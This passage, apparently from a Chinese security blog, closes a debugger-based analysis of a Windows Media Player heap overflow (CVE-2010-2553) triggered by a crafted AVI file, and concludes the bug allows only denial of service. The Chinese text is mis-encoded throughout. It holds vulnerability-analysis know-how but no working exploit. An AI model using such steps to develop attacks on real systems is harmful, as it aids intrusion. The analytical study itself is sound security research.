        odé™„åŠ wmplayer.exe
        wmplayer.exeæ‰“å¼€åŸæ¥çš„poc.avi
        ä¸­æ–­åˆ°å…³é”®callå¤„å³é”®æŸ¥æ‰¾æ‰€æœ‰æ¨¡å—é—´çš„è°ƒç”¨
        åœ¨æ¯ä¸ªkernel32.LocalAllocä¸Šè®¾ç½®æ–­ç‚¹(è¿™é‡Œæ²¡æœ‰HeapAlloc,åªæœ‰LocalAlloc),ä¸€å…±æœ‰10ä¸ªLocalAllocè°ƒç”¨
            LocalAllocå’ŒHeapAllocçš„åŒºåˆ«:
            http://bbs.csdn.net/topics/350074008
            ç”±ä¸Šé¢é“¾æ¥å¯çŸ¥,LocalAllocæ˜¯åœ¨è¿›ç¨‹é»˜è®¤å †ä¸Šåˆ†é…ç©ºé—´,è€ŒHeapAllocä¸€èˆ¬æ˜¯ç”±HeapCreateæ–°ç”Ÿæˆçš„å †ä¸­åˆ†é…ç©ºé—´
            ,å½“HeapAllocçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯GetProcessHeap()çš„å€¼é™¤å¤–
        é‡æ–°è¿è¡Œwmplayer.exeå¹¶ç”¨odé™„åŠ ,å¹¶ç”¨wmplayer.exeæ‰“å¼€åŸæ¥çš„poc.avi

    odä¸­æ–­åˆ°ä¸‹é¢çš„73b7b4a9å¤„çš„LocalAlloc
        73B7B4A2  |&gt; \68 A0000000   push 0xA0                                             ; /Size = A0 (160.)
        73B7B4A7  |.  6A 40         push 0x40                                             ; |Flags = LPTR
        73B7B4A9  |.  FF15 4C10B773 call dword ptr ds:[&lt;&amp;KERNEL32.LocalAlloc&gt;]            ; \LocalAlloc

    æ­¤æ—¶åœ¨æ•°æ®çª—å£ä¸­ctrl+g:1c2caf8,å‘ç°1c2caf8å¤„å°šä¸”æ²¡æœ‰å†™å…¥poc.aviä¸­æ„é€ çš„æ•°æ®,è¯´æ˜è¿™ä¸ªLocalAllocä¸æ˜¯æ»¡è¶³
    "poc.aviä¸­æ„é€ çš„æ•°æ®å†™å…¥å†…å­˜åçš„å †åˆ†é…"çš„è°ƒç”¨,f8å•æ­¥åeax=001135C8,ä¸Šé¢çš„rep movsæŒ‡ä»¤å¤„çš„å †å—åœ¨a0000å †çš„
    147000å †å—é™„è¿‘

    f9
        ä¸­æ–­åˆ°73b72432å¤„çš„call kernel32.localalloc,æ­¤æ—¶æ•°æ®çª—å£ä¸­1c2caf8å¤„ä¾ç„¶æ²¡æœ‰å†™å…¥åŸæ¥poc.aviä¸­æ„é€ çš„æ•°æ®

    f9
        ä¾ç„¶æ²¡æœ‰å†™å…¥...
    f9
        è¿™ä¸ªf9è¦æŒ‰å¿«ä¸€ç‚¹,è¦ä¸ç„¶odä¸­ä¸ä¼šåœ¨1c2caf8å¤„å†™å…¥æ•°æ®,è¿™ä¸ªf9ä¹‹åä¸­æ–­ä¸‹æ¥åˆ°å…³é”®callè°ƒç”¨å¤„,æ­¤æ—¶æ•°æ®çª—å£ä¸­çš„
        1c2caf8å¤„å·²ç»å†™å…¥äº†åŸæ¥poc.aviä¸­çš„æ„é€ çš„æ•°æ®

    f9
        æ­¤æ—¶å¼¹å‡ºä¸Šé¢ä¸€æ ·çš„å†…å­˜ä¸å¯å†™çš„å‡ºé”™æ¡†(ç”±äºrep movså†™å…¥åˆ°ä¸å¯å†™çš„åœ°å€é€ æˆ)
</code></pre></div></div>
<p><img src="https://raw.githubusercontent.com/3xp10it/pic/master/heap-7.png" /></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ä¸Šé¢ä¸¤æ¬¡f9ä¹‹å1c2caf8ä¸­æ²¡æœ‰å†™å…¥æ•°æ®,ç¬¬ä¸‰æ¬¡f9ä¹‹å1c2caf8ä¸­å†™å…¥æ•°æ®,ç¬¬å››æ¬¡f9å¼‚å¸¸å‡ºç°å®Œ,è¦æ±‚æ‰¾åˆ°çš„LocalAllocç¬¦
    åˆè¿™ä¸ªæ¡ä»¶:
        "poc.aviä¸­æ„é€ çš„æ•°æ®å†™å…¥å†…å­˜åçš„å †åˆ†é…"
    ä½†æ˜¯ä»ä¸Šé¢ç¬¬2ä¸ªf9åˆ°ç¬¬å››ä¸ªf9ä¹‹é—´æ²¡æœ‰ä¸­æ–­åˆ°ä»»ä½•LocalAllocçš„è°ƒç”¨,è¯´æ˜æ‰¾ä¸åˆ°ç¬¦åˆæ¡ä»¶çš„å †å—åˆ†é…,ä¹Ÿå³æ²¡æœ‰DWORD
    SHOOTçš„æœºä¼š,ä¹Ÿå³æ²¡æœ‰åŠæ³•æ§åˆ¶eip,è¯´æ˜è¿™ä¸ªcve-2010-2553åªæ˜¯ä¸ªdos(denial of Service)ç±»æ¼æ´

</code></pre></div></div>
</span>

        


        
        <div class="tags">
          <small>
          <i class="fa fa-tags"></i>
            æ¼æ´æˆ˜äº‰, æ¼æ´åˆ†æ, å †æº¢å‡º
          </small>
        </div>
        

      </div>

      
      <div class="content-panel feedback">
        I <i class="fa fa-heart"></i> feedback.<br />
        Let me know what you think of this article on twitter <a href="https://www.twitter.com/quanyechavshuo">@quanyechavshuo</a>!
      </div>
      


      


<!-- ä¸ªäººå¢åŠ ç»‡ç½‘èƒŒæ™¯æ•ˆæœ -->
<!--
<script type="text/javascript" color="255,255,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
-->


      



      


      

    </div>

  </div>

</div>





      </div>
    </div>

    <div class="footer clearfix">
  <div class="col-md-12">
		  <!--for better experience please install font æ–‡æ³‰é©¿ç­‰å®½æ­£é»‘-->
Since March 2016 the 3xp10it.cc has been running  <span id="times" style="align: center no:1px solid black"></span><br />
	<SCRIPT language=javascript> 
	<!-- 
	function show_date_time(){ 
		window.setTimeout("show_date_time()", 1000); 
		BirthDay=new Date("3/7/2016 20:00:00");
		today=new Date(); 
		timeold=(today.getTime() - BirthDay.getTime()); 
		sectimeold=timeold/1000 
		secondsold=Math.floor(sectimeold); 
		msPerDay=24*60*60*1000 
		e_daysold=timeold/msPerDay 
		daysold=Math.floor(e_daysold); 
		e_hrsold=(e_daysold-daysold)*24; 
		hrsold=Math.floor(e_hrsold); 
		e_minsold=(e_hrsold-hrsold)*60; 
		minsold=Math.floor((e_hrsold-hrsold)*60); 
		seconds=Math.floor((e_minsold-minsold)*60); 
		//times = document.getElementById("times");
		times.innerHTML="<span>"+daysold+ "days " +hrsold+"hours "+minsold+"minutes"+seconds+"seconds"+"</span>" ; 
	} 
	show_date_time(); 
	//--> 
	</SCRIPT>
  </div>
</div>

<div class="my-home"><i class="fa fa-home" aria-hidden="true"></i><a href="/index2.html"> <font color="white">home</font></a></div>
<div class="my-papers"><i class="fa fa-github" aria-hidden="true"></i><a href="https://github.com/3xp10it" target="_top"> <font color="white">github</font></a></div>
<div class="my-search"><i class="fa fa-search" aria-hidden="true"></i><a href="/search/"> <font color="white">search</font></a></div>
<div class="my-archive"><i class="fa fa-folder" aria-hidden="true"></i><a href="/my-archive/"> <font color="white">archive</font></a></div>
<div class="my-categories"><i class="fa fa-apple" aria-hidden="true"></i><a href="/my-categories/"> <font color="white">category</font></a></div>


<script src="/js/jquery-1.11.0.min.js"></script>
<!--
<script src="/js/bootstrap.min.js"></script>
-->
<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

<script src="/js/jquery.mmenu.min.all.js"></script>
<script src="/js/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script>
<script type="text/javascript">
   $(document).ready(function() {
      $("#my-menu").mmenu().on( "closed.mm", function() {
            $(".menu-button").show();
         });
      $(".menu-button").click(function() {
        $(".menu-button").hide();
        $("#my-menu").trigger("open.mm");
      });
   });
</script>





<!--
<script type="text/javascript"> 
$youziku.load("h1,h2,h3,h4,h5,h6,code,.content,.content-panel,.gravatar,pre,body", "354f6990dc1b43608d3eb96d50273504", "WenQuanYi_Zen_Hei_Mono");
$youziku.draw(); 
</script>
-->


    </body>
</html>
